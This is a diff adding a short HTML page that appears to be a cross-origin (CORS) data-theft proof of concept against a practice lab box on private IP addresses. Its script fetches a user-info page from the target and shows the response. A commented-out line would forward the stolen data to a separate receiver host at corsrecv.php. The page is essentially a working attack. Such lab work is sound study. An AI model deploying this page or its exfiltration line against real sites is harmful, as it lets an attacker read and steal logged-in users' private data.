@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="jquery-3.4.1.min.js"></script>
+    <title>Document</title>
+    <script>
+//         $.get('http://192.168.31.166/temp/cors.php',function(data){
+        $.get('http://192.168.31.166/temp/dorabox/csrf/userinfo.php',function(data){
+            alert(data);
+//             location.href = 'http://192.168.31.238:8080/corsrecv.php?data='+data;
+        })
+    </script>
+</head>
+<body>
+    
+</body>
+</html>
